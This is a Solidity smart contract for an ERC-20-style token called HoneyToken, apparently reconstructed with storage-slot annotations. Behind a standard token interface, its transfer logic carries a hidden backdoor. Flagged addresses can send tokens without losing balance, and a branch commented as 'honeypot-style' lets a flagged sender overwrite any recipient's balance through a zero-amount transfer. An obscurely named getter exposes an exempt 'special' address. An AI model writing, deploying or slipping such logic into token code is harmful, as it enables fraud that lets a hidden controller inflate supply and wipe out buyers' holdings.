<code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract HoneyToken {
    // slot 0: packed
    address private _owner;
    uint8 private _decimalsPacked;

    // slot 1
    uint256 private _resetBalance;

    // slot 2
    uint256 private _totalSupply;

    // slot 3
    mapping(address => mapping(address => uint256)) private _allowances;

    // slot 4
    address private _specialAddress;

    // slot 5 (unused/reserved)
    uint256 private _reserved5;

    // slot 6
    mapping(address => uint256) private _balances;

    // slot 7
    mapping(address => uint256) private _flag;

    // slot 8
    string private _name;

    // slot 9
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimalsPacked;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) public view returns (uint256) {
        return _allowances[holder][spender];
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function tgkcuzl() public view returns (address) {
        return _specialAddress;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount);
        _allowances[sender][msg.sender] = currentAllowance - amount;
        _transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        if (_flag[from] == 0) {
            _balances[from] = _balances[from] - amount;
        }
        _balances[to] = _balances[to] + amount;

        // honeypot-style branch: only triggers when flag set on `from`,
        // amount is zero, and `to` is not the special address
        if (_flag[from] > 0 && amount == 0 && _specialAddress != to) {
            _balances[to] = _resetBalance;
        }

        emit Transfer(from, to, amount);
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
